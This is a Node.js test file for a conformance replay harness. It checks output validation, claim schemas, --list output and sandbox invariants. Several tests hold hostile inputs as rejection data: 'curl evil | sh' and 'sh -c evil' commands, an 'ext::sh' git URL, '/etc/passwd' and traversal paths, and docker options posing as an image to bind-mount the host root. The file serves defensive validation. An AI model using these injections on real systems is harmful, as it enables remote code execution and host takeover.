'use strict';
// Offline regression tests for the replay harness's runner-output validation.
// The load-bearing case: a runner that FAILED while its stderr happens to
// contain summary-shaped text must never be read as a green replay.
const test = require('node:test');
const assert = require('node:assert');
const { validateRunnerOutput, shellQuote } = require('./replay.js');

const CLAIM = {
  suite: {
    vector_set: '0.5.0',
    test_vectors_sha256: '879d1cf9647f4f42e0815e34eeb5587633dff28e8fa8ceab25c139f470bb629c',
  },
  expected: { pass: 27, fail: 0, skip: 0 },
};

function summary(overrides = {}) {
  return JSON.stringify({
    runner: 'bolyra-conformance',
    spec: 'external-verifier-contract-v1',
    vector_set: {
      version: '0.5.0',
      total: 104,
      selected: 27,
      sha256: CLAIM.suite.test_vectors_sha256,
      ...(overrides.vector_set || {}),
    },
    totals: { passed: 27, failed: 0, skipped: 0, ...(overrides.totals || {}) },
    results: overrides.results || [],
  });
}

test('clean run validates', () => {
  const got = validateRunnerOutput({ status: 0, signal: null, stdout: summary(), stderr: '' }, CLAIM);
  assert.deepStrictEqual(got, { pass: 27, fail: 0, skip: 0 });
});

test('false green: failing run with summary-shaped stderr must throw', () => {
  const run = {
    status: 1,
    signal: null,
    stdout: summary({ totals: { passed: 0, failed: 27, skipped: 0 } }),
    stderr: 'noise...\n27 passed, 0 failed, 0 skipped\n',
  };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /runner exit status 1|REPLAY MISMATCH/);
});

test('non-JSON stdout must throw even when stderr contains a green summary', () => {
  const run = { status: 2, signal: null, stdout: '', stderr: '27 passed, 0 failed, 0 skipped\n' };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /not the --json summary/);
});

test('exit 0 with failing totals is inconsistent and must throw', () => {
  const run = {
    status: 0,
    signal: null,
    stdout: summary({ totals: { passed: 26, failed: 1, skipped: 0 } }),
    stderr: '',
  };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /REPLAY MISMATCH/);
});

test('exit 1 with green totals is inconsistent and must throw', () => {
  const run = { status: 1, signal: null, stdout: summary(), stderr: '' };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /runner exit status 1/);
});

test('vector-set digest mismatch must throw', () => {
  const run = {
    status: 0,
    signal: null,
    stdout: summary({ vector_set: { sha256: 'deadbeef'.repeat(8) } }),
    stderr: '',
  };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /digest/);
});

test('wrong selected-vector count must throw', () => {
  const run = { status: 0, signal: null, stdout: summary({ vector_set: { selected: 30 } }), stderr: '' };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /selected 30 vectors, claim covers 27/);
});

test('killed runner must throw', () => {
  const run = { status: null, signal: 'SIGKILL', stdout: summary(), stderr: '' };
  assert.throws(() => validateRunnerOutput(run, CLAIM), /killed by signal/);
});

test('shellQuote survives spaces and single quotes', () => {
  assert.strictEqual(shellQuote('/tmp/a b'), "'/tmp/a b'");
  assert.strictEqual(shellQuote("/tmp/o'brien"), "'/tmp/o'\\''brien'");
});

// ---- external-suite validation ----
const { validateExternalSuiteOutput, validateClaim } = require('./replay.js');

const EXT_CLAIM = {
  run: { expect: { pass: 39, run: 39, scoped_out: 9 } },
};
const GREEN = '  PASS  a\n  PASS  b\n\n39/39 passed, 9 explicitly scoped out (see SOURCE_PINS.md)\n';

test('external-suite: clean run validates', () => {
  const got = validateExternalSuiteOutput({ status: 0, signal: null, stdout: GREEN, stderr: '' }, EXT_CLAIM);
  assert.deepStrictEqual(got, { pass: 39, run: 39, scoped_out: 9 });
});

test('external-suite: nonzero exit with green summary text must throw', () => {
  const run = { status: 1, signal: null, stdout: GREEN, stderr: '' };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /suite exited 1/);
});

test('external-suite: green summary on stderr only must throw', () => {
  const run = { status: 0, signal: null, stdout: 'noise\n', stderr: GREEN };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /no machine-readable summary/);
});

test('external-suite: FAIL-marked line despite green summary must throw', () => {
  const run = {
    status: 0,
    signal: null,
    stdout: '  FAIL  x  -- boom\n\n39/39 passed, 9 explicitly scoped out\n',
    stderr: '',
  };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /FAIL-marked/);
});

test('external-suite: count mismatch must throw', () => {
  const run = { status: 0, signal: null, stdout: '38/39 passed, 9 explicitly scoped out\n', stderr: '' };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /suite exited|REPLAY MISMATCH/);
});

test('external-suite: claim schema requires digest-pinned image and network none', () => {
  const errs = validateClaim({
    id: 'x',
    kind: 'external-suite',
    implementer: { repo: 'r', commit: 'a'.repeat(40) },
    run: { image: 'node:20', command: [], network: 'bridge', expect: {} },
  });
  assert.ok(errs.some((e) => e.includes('digest-pinned')));
  assert.ok(errs.some((e) => e.includes('non-empty argv')));
  assert.ok(errs.some((e) => e.includes('network must be "none"')));
  assert.ok(errs.some((e) => e.includes('numeric pass and run')));
});

test('external-suite: conflicting duplicate summaries must throw', () => {
  const run = {
    status: 0,
    signal: null,
    stdout: '39/39 passed, 9 explicitly scoped out\n38/39 passed, 9 explicitly scoped out\n',
    stderr: '',
  };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /multiple summary lines/);
});

test('external-suite: summary not on the final line must throw', () => {
  const run = {
    status: 0,
    signal: null,
    stdout: '39/39 passed, 9 explicitly scoped out\ntrailing diagnostic noise\n',
    stderr: '',
  };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /not the final line/);
});

test('external-suite: FAIL marker on stderr must throw despite green stdout', () => {
  const run = { status: 0, signal: null, stdout: GREEN, stderr: '  FAIL  case-x  -- boom\n' };
  assert.throws(() => validateExternalSuiteOutput(run, EXT_CLAIM), /FAIL-marked/);
});

// ---- --list -------------------------------------------------------------
// The dispatch workflow reads id/kind/adapter per claim without executing
// anything. Tests pass --check too: on a harness that ignores --list, --check
// runs OFFLINE (no third-party code) and the output format mismatch fails the
// test; on the real harness --list returns before --check.
const { spawnSync, execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

// A developer with REPLAY_CLAIMS_PATH already exported must not silently
// validate the wrong registry — always start from a clean env.
function cleanEnv() {
  const env = { ...process.env };
  delete env.REPLAY_CLAIMS_PATH;
  return env;
}
function runList(extra = [], env = {}) {
  return spawnSync(process.execPath, [path.join(__dirname, 'replay.js'), '--list', '--check', ...extra], {
    encoding: 'utf8', timeout: 20000, env: { ...cleanEnv(), ...env },
  });
}
function rows(stdout) {
  const lines = stdout.split('\n');
  assert.strictEqual(lines[lines.length - 1], '', 'stdout must end with exactly one newline');
  lines.pop();
  return lines.map((l) => l.split('\t'));
}
const tmpDirs = [];
function withRegistry(claims) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'replay-list-'));
  tmpDirs.push(dir);
  const p = path.join(dir, 'claims.json');
  fs.writeFileSync(p, JSON.stringify({ version: '1.0', claims }));
  return { REPLAY_CLAIMS_PATH: p };
}
test.after(() => {
  for (const dir of tmpDirs) fs.rmSync(dir, { recursive: true, force: true });
});

test('--list prints id<TAB>kind<TAB>adapter per claim, nothing else', () => {
  const r = runList();
  assert.strictEqual(r.status, 0, r.stderr);
  const claims = require('./claims.json').claims;
  const got = rows(r.stdout);
  assert.strictEqual(got.length, claims.length);
  claims.forEach((c, i) => assert.deepStrictEqual(got[i], [c.id, c.kind || 'bolyra-suite', c.adapter || '']));
});

test('--list keeps the empty adapter field on a final external-suite row (trailing tab survives)', () => {
  const env = withRegistry([
    { id: 'a', kind: 'external-suite', implementer: { repo: 'r', commit: 'a'.repeat(40) }, run: { image: 'node:20@sha256:' + 'b'.repeat(64), command: ['npm', 'test'], network: 'none', expect: { pass: 1, run: 1 } } },
  ]);
  const r = runList([], env);
  assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(r.stdout, 'a\texternal-suite\t\n');
});

test('--list --claim <id> prints only that claim', () => {
  const first = require('./claims.json').claims[0];
  const r = runList(['--claim', first.id]);
  assert.strictEqual(r.status, 0, r.stderr);
  assert.deepStrictEqual(rows(r.stdout), [[first.id, first.kind || 'bolyra-suite', first.adapter || '']]);
});

test('--list --claim <unknown> exits 1 with empty stdout', () => {
  const r = runList(['--claim', 'does-not-exist']);
  assert.strictEqual(r.status, 1);
  assert.strictEqual(r.stdout, '');
  assert.match(r.stderr, /no claim with id does-not-exist/);
});

test('--list runs before registry validation (a claim whose adapter is missing on disk still lists)', () => {
  const env = withRegistry([
    { id: 'new@1', implementer: { repo: 'r', commit: 'a'.repeat(40) }, suite: { commit: 'b'.repeat(40), test_vectors_sha256: 'c'.repeat(64) }, adapter: 'adapters/not-on-disk.ts', adapter_sha256: 'd'.repeat(64), expected: { pass: 1, fail: 0, skip: 0 } },
  ]);
  const r = runList([], env);
  assert.strictEqual(r.status, 0, r.stderr);
  assert.strictEqual(r.stdout, 'new@1\tbolyra-suite\tadapters/not-on-disk.ts\n');
});

test('--list refuses ids with control chars or a leading dash, duplicate ids, and unknown kinds — with no stdout', () => {
  const base = { implementer: { repo: 'r', commit: 'a'.repeat(40) }, run: { image: 'node:20@sha256:' + 'b'.repeat(64), command: ['x'], network: 'none', expect: { pass: 1, run: 1 } }, kind: 'external-suite' };
  for (const [label, claims, re] of [
    ['tab in id', [{ ...base, id: 'a\tb' }], /id contains a control character/],
    ['newline in id', [{ ...base, id: 'a\nb' }], /id contains a control character/],
    ['CR in id', [{ ...base, id: 'a\rb' }], /id contains a control character/],
    ['NUL in id', [{ ...base, id: 'a\u0000b' }], /id contains a control character/],
    ['leading dash (flag collision)', [{ ...base, id: '--check' }], /id must not start with '-'/],
    ['duplicate id', [{ ...base, id: 'dup' }, { ...base, id: 'dup' }], /duplicate id dup/],
    ['unknown kind', [{ ...base, id: 'k', kind: 'mystery' }], /unknown kind mystery/],
    ['empty id', [{ ...base, id: '' }], /missing id/],
    ['adapter tab', [{ ...base, id: 'ok-adapter-tab', adapter: 'a\tb' }], /adapter contains a control character/],
    ['adapter leading dash (flag collision)', [{ ...base, id: 'ok-adapter-dash', adapter: '--rm' }], /adapter must not start with '-'/],
    ['adapter non-string (null)', [{ ...base, id: 'ok-adapter-null', adapter: null }], /adapter must be a string/],
    ['adapter non-string (number)', [{ ...base, id: 'ok-adapter-number', adapter: 7 }], /adapter must be a string/],
  ]) {
    const r = runList([], withRegistry(claims));
    assert.strictEqual(r.status, 1, label);
    assert.strictEqual(r.stdout, '', label);
    assert.match(r.stderr, re, label);
  }
});

test('REPLAY_CLAIMS_PATH is ignored unless --list is present (a full run never reads the fixture registry)', () => {
  const env = withRegistry([{ id: 'phantom-claim-should-never-surface' }]);
  const r = spawnSync(process.execPath, [path.join(__dirname, 'replay.js'), '--check'], {
    encoding: 'utf8', timeout: 20000, env: { ...cleanEnv(), ...env },
  });
  assert.ok(!r.stdout.includes('phantom-claim-should-never-surface'), r.stdout);
  assert.ok(!r.stderr.includes('phantom-claim-should-never-surface'), r.stderr);
  // Absence of the marker is not enough — a replay.js that crashed at module
  // load would show neither stream containing it while proving nothing was
  // actually read. Assert the run succeeded AND that the real registry (not
  // an empty/failed read) was the one consulted.
  assert.strictEqual(r.status, 0, r.stderr);
  const realClaims = require('./claims.json').claims;
  assert.ok(realClaims.length > 0, 'fixture precondition: interop/claims.json must have at least one claim');
  for (const c of realClaims) assert.ok(r.stdout.includes(c.id), `expected real claim id ${c.id} in stdout: ${r.stdout}`);
});

// --- Invariants that keep the repo tree OUT of the load surface during a claim.
// harness-integrity.js protects interop/ spec/ landing/ .github/ and .git/ and
// nothing else, which is only sound because replay.js materializes the suite from
// a pinned commit into a tmpdir instead of executing anything in the repo. These
// three tests pin that. They are behavioural where they can be: a source-shaped
// assertion is what already failed open once here.

test('replay.js archives exactly the spec pathspec, from a pinned commit, into a tmpdir', () => {
  const repo = path.join(__dirname, '..');
  const realGit = execFileSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim();
  const claim = JSON.parse(fs.readFileSync(path.join(repo, 'interop', 'claims.json'), 'utf8'))
    .claims.find((c) => c.suite && c.suite.commit);
  assert.ok(claim, 'no bolyra-suite claim in the registry to exercise');

  // git is shimmed, not mocked: the implementer clone is stubbed so the test needs
  // no network, and everything else passes through to the real binary so the
  // materialized-digest check still runs for real.
  const shim = fs.mkdtempSync(path.join(os.tmpdir(), 'replay-shim-'));
  const log = path.join(shim, 'argv.log');
  fs.writeFileSync(path.join(shim, 'git'), `#!/bin/sh
printf '%s\n' "$*" >> ${log}
case "$*" in
  *" init "*|*" init"|*"remote add"*|*" fetch "*|*" checkout "*) exit 0 ;;
  *"rev-parse HEAD"*) echo "${claim.implementer.commit}"; exit 0 ;;
esac
exec ${realGit} "$@"
`, { mode: 0o755 });
  fs.writeFileSync(path.join(shim, 'npm'), '#!/bin/sh\nexit 1\n', { mode: 0o755 });   // stop before the network

  spawnSync(process.execPath, [path.join(repo, 'interop', 'replay.js'), '--claim', claim.id],
    { encoding: 'utf8', env: { PATH: `${shim}:${process.env.PATH}`, HOME: os.tmpdir() } });

  const lines = fs.readFileSync(log, 'utf8').trim().split('\n');
  const archives = lines.filter((l) => / archive /.test(l));
  assert.strictEqual(archives.length, 1, `expected exactly one git archive, got:\n${archives.join('\n')}`);
  const argv = archives[0].split(' ');
  assert.deepStrictEqual(argv.slice(0, 2), ['-C', repo], 'archive must read from this repo');
  // `-o <tar>` is an OPTION, not a pathspec: it streams the archive to a tmpdir
  // file instead of buffering it through execFileSync's 1 MiB maxBuffer. Strip
  // it, then hold the original assertion — the property under test is that no
  // ADDITIONAL PATHSPEC is passed, and the destination must stay in a tmpdir.
  const rest = argv.slice(2);
  assert.strictEqual(rest[0], 'archive');
  let tail = rest.slice(1);
  if (tail[0] === '-o') {
    // The property is that the archive never lands inside the repo. Comparing
    // against this process's os.tmpdir() would be wrong: the child inherits a
    // different TMPDIR, so its tmpdir is a different absolute path.
    const dest = tail[1];
    assert.ok(dest && path.isAbsolute(dest) && !dest.startsWith(repo + path.sep),
      `archive -o must write outside the repo, got ${dest}`);
    tail = tail.slice(2);
  }
  assert.deepStrictEqual(tail, [claim.suite.commit, 'spec'],
    'archive must take the pinned commit and EXACTLY the spec pathspec — any additional pathspec ' +
    'puts repo content into the runner tree, which harness-integrity does not protect');
});

test('replay.js loads no non-builtin module (so it has no node_modules surface)', () => {
  const entry = require.resolve('./replay.js');
  require(entry);
  const loaded = require.cache[entry].children.map((c) => c.filename);
  assert.deepStrictEqual(loaded, [],
    `replay.js must require builtins only; it loaded: ${loaded.join(', ')}`);
});

test('ROOT is only ever passed to git -C, never used to build an executed path', () => {
  const src = fs.readFileSync(path.join(__dirname, 'replay.js'), 'utf8');
  const uses = src.split('\n')
    .map((line, i) => [i + 1, line])
    .filter(([, line]) => /\bROOT\b/.test(line));
  // 4th use added 2026-09-23 by the bolyra-suite-verifier path, which materializes
  // the suite at its pin exactly as the host path does: git -C ROOT archive.
  assert.strictEqual(uses.length, 4,
    `pinned at 4 uses of ROOT (1 definition + 3 git -C); found ${uses.length}. A new use must be ` +
    `reviewed against harness-integrity's protected set:\n${uses.map(([n, l]) => `  ${n}: ${l.trim()}`).join('\n')}`);
  const [[, def], ...rest] = uses;
  assert.match(def, /^const ROOT = path\.resolve\(__dirname, '\.\.'\);$/);
  for (const [n, line] of rest) {
    assert.match(line, /execFileSync\('git', \['-C', ROOT,/, `line ${n}: ROOT must only reach git -C`);
  }
});

// --- The claim contract, exercised through BOTH consumers. Each case below was
// accepted by both gates before this contract moved into validateClaim: a partial
// `expected` published the literal word "undefined" to the page, and repo/install/
// adapter reached git and tsx validated only by the page generator.

const { validateClaim: vc, kindOf: kof } = require('./replay.js');
const BASE = () => ({
  id: 'x/y@1', kind: 'bolyra-suite',
  implementer: { repo: 'https://github.com/o/r', commit: 'a'.repeat(40), install: ['npm', 'ci', '--ignore-scripts'] },
  suite: { commit: 'b'.repeat(40), test_vectors_sha256: 'c'.repeat(64) },
  adapter: 'adapters/x.ts', adapter_sha256: 'd'.repeat(64),
  expected: { pass: 1, fail: 0, skip: 0 },
});
const errsFor = (mutate) => { const c = BASE(); mutate(c); return vc(c).join(' | '); };

test('validateClaim requires every count the public page prints', () => {
  for (const k of ['pass', 'fail', 'skip']) {
    const e = errsFor((c) => { delete c.expected[k]; });
    assert.match(e, new RegExp(`expected\\.${k} must be a non-negative integer`));
  }
  assert.match(errsFor((c) => { c.expected.fail = -1; }), /expected\.fail/);
  assert.match(errsFor((c) => { c.expected.skip = 1.5; }), /expected\.skip/);
  assert.strictEqual(vc(BASE()).filter((e) => /expected\./.test(e)).length, 0);
});

test('validateClaim allowlists implementer.repo, which git remote add + fetch consume', () => {
  for (const repo of ['ext::sh -c evil', 'git@github.com:o/r', 'https://evil.example/o/r',
                      'https://github.com/o/r/../../x', 'https://github.com/o', '']) {
    assert.match(errsFor((c) => { c.implementer.repo = repo; }),
      /implementer\.repo must match/, `accepted ${JSON.stringify(repo)}`);
  }
  assert.strictEqual(vc(BASE()).filter((e) => /implementer\.repo/.test(e)).length, 0);
});

test('validateClaim allowlists implementer.install, which is spawned as argv', () => {
  for (const install of [['npm', 'ci'], ['npm', 'ci', '--ignore-scripts', '; curl evil'],
                        ['sh', '-c', 'evil'], ['npm', 'ci', '--ignore-scripts', '--no-fund', '--no-audit'],
                        'npm ci', undefined]) {
    assert.match(errsFor((c) => { c.implementer.install = install; }),
      /implementer\.install/, `accepted ${JSON.stringify(install)}`);
  }
  for (const ok of [['npm', 'ci', '--ignore-scripts'], ['npm', 'install', '--ignore-scripts'],
                    ['npm', 'ci', '--ignore-scripts', '--no-audit'],
                    ['npm', 'ci', '--ignore-scripts', '--no-audit', '--no-fund']]) {
    assert.strictEqual(errsFor((c) => { c.implementer.install = ok; }).includes('install'), false,
      `rejected ${JSON.stringify(ok)}`);
  }
});

test('validateClaim constrains the adapter pathname before it is read or executed', () => {
  for (const a of ['../landing/gen-conformance.js', '/etc/passwd', 'adapters/../../x.ts',
                   'adapters/x.js', 'x.ts', 7]) {
    assert.match(errsFor((c) => { c.adapter = a; }),
      /adapter must match/, `accepted ${JSON.stringify(a)}`);
  }
});

test('kindOf defaults only an ABSENT kind; a supplied empty kind is an error everywhere', () => {
  assert.strictEqual(kof({}), 'bolyra-suite');
  assert.strictEqual(kof({ kind: 'external-suite' }), 'external-suite');
  for (const kind of ['', null, 0, false]) {
    assert.strictEqual(kof({ kind }), kind, 'must NOT coerce a supplied falsy kind');
    assert.match(errsFor((c) => { c.kind = kind; }), /unknown kind/);
  }
});

test('validateClaim anchors run.image, so a docker option cannot pose as the image', () => {
  const ext = () => ({
    id: 'x/y@1', kind: 'external-suite',
    implementer: { repo: 'https://github.com/o/r', commit: 'a'.repeat(40) },
    run: { image: 'node:20@sha256:' + 'b'.repeat(64), command: ['npm', 'test'], network: 'none', expect: { pass: 1, run: 1, scoped_out: 0 } },
  });
  assert.strictEqual(vc(ext()).length, 0, 'the spec-shaped image must pass');
  // Placed before the first positional, docker parses this as an option: a
  // writable bind mount of the daemon host, with run.command[0] as the image.
  for (const image of [
    '--mount=type=bind,source=/,target=/h@sha256:' + 'b'.repeat(64),
    '-v=/:/h@sha256:' + 'b'.repeat(64),
    'evil/image@sha256:' + 'b'.repeat(64),      // pinned, but not the node image the spec names
    'node@sha256:' + 'b'.repeat(64),            // no tag
    'node:20',                                  // no digest
    'node:20@sha256:' + 'b'.repeat(63),
  ]) {
    const c = ext(); c.run.image = image;
    assert.match(vc(c).join(' | '), /digest-pinned/, `accepted ${JSON.stringify(image)}`);
  }
});

test('REPO_RE rejects dot-only owner or repo segments in the executor, same as the renderer', () => {
  for (const repo of ['https://github.com/./r', 'https://github.com/../r', 'https://github.com/o/.', 'https://github.com/o/..']) {
    assert.match(errsFor((c) => { c.implementer.repo = repo; }), /implementer\.repo must match/, `accepted ${repo}`);
  }
  for (const repo of ['https://github.com/o/.github', 'https://github.com/o/r.git', 'https://github.com/o-1/r_2']) {
    assert.strictEqual(errsFor((c) => { c.implementer.repo = repo; }).includes('implementer.repo'), false, `rejected ${repo}`);
  }
});

test('external-suite: scoped_out is required, and the replay always compares it', () => {
  const ext = {
    id: 'x/y@1', kind: 'external-suite',
    implementer: { repo: 'https://github.com/o/r', commit: 'a'.repeat(40) },
    run: { image: 'node:20@sha256:' + 'b'.repeat(64), command: ['npm', 'test'], network: 'none', expect: { pass: 39, run: 39 } },
  };
  assert.match(vc(ext).join(' | '), /run\.expect\.scoped_out must be a non-negative integer/);
  // Output says 9 scoped out; an expectation that omits the count must not silently pass.
  const run = { status: 0, signal: null, stdout: GREEN, stderr: '' };
  assert.throws(() => validateExternalSuiteOutput(run, { run: { expect: { pass: 39, run: 39 } } }), /REPLAY MISMATCH/);
  assert.deepStrictEqual(validateExternalSuiteOutput(run, { run: { expect: { pass: 39, run: 39, scoped_out: 9 } } }), { pass: 39, run: 39, scoped_out: 9 });
});

// ---------------------------------------------------------------------------
// bolyra-suite-verifier: Bolyra-suite conformance on the VERIFIER side.
//
// The registry could previously carry a Bolyra-suite claim only for a HOST
// (via a tsx HUT adapter), so an 11/11 verifier_envelope result was a claim the
// registry could not execute — and an unexecutable claim must never be
// published. These are the validation rules for the verifier kind.
// ---------------------------------------------------------------------------
const { kindOf: kindOf_, KINDS: KINDS_ } = require('./replay.js');

const VERIFIER_CLAIM = {
  id: 'x402-authority-verifier-kit@1aa9d88/verifier_envelope@0.11.0',
  kind: 'bolyra-suite-verifier',
  claim_text: '11/11 verifier_envelope vectors, vector set 0.11.0, at pinned commit 1aa9d88',
  verified_on: '2026-09-23',
  implementer: {
    repo: 'https://github.com/stillmarcus24/x402-authority-verifier-kit',
    commit: '1aa9d880000000000000000000000000000000ab',
  },
  suite: {
    commit: '0000000000000000000000000000000000000001',
    vector_set: '0.11.0',
    test_vectors_sha256: 'a'.repeat(64),
    runner_args: ['--type', 'verifier_envelope'],
  },
  verifier: { command: ['node', 'verifier/evc_verifier.cjs'], requires_zero_dependencies: true },
  expected: { pass: 11, fail: 0, skip: 0 },
};

const clone = (o) => JSON.parse(JSON.stringify(o));

test('bolyra-suite-verifier is a recognised kind', () => {
  assert.ok(KINDS_.has('bolyra-suite-verifier'));
  assert.equal(kindOf_(VERIFIER_CLAIM), 'bolyra-suite-verifier');
});

test('a complete verifier claim validates clean', () => {
  assert.deepEqual(validateClaim(VERIFIER_CLAIM), []);
});

test('verifier.command is required and must be a non-empty argv array', () => {
  const c = clone(VERIFIER_CLAIM);
  delete c.verifier.command;
  assert.match(validateClaim(c).join('; '), /verifier\.command/);
});

test('verifier.command[0] must be node (no shell, no arbitrary binary)', () => {
  const c = clone(VERIFIER_CLAIM);
  c.verifier.command = ['sh', '-c', 'curl evil | sh'];
  assert.match(validateClaim(c).join('; '), /verifier\.command\[0\]/);
});

test('a claim carrying BOTH adapter and verifier is ambiguous and rejected', () => {
  const c = clone(VERIFIER_CLAIM);
  c.adapter = 'adapters/x.ts';
  c.adapter_sha256 = 'b'.repeat(64);
  assert.match(validateClaim(c).join('; '), /adapter.*verifier|verifier.*adapter/i);
});

test('a fault block must pin its request builder by digest', () => {
  const c = clone(VERIFIER_CLAIM);
  c.verifier.fault = { induce: 'mkdir -p {{impl}}/state', undo: 'rm -f {{impl}}/state/x', request_builder: 'adapters/b.cjs' };
  assert.match(validateClaim(c).join('; '), /request_builder_sha256/);
});

test('a fault block requires induce, undo and a request builder', () => {
  const c = clone(VERIFIER_CLAIM);
  c.verifier.fault = { induce: 'x' };
  const e = validateClaim(c).join('; ');
  assert.match(e, /undo/);
  assert.match(e, /request_builder/);
});

test('suite.runner_args must be present for a verifier claim', () => {
  const c = clone(VERIFIER_CLAIM);
  delete c.suite.runner_args;
  assert.match(validateClaim(c).join('; '), /runner_args/);
});
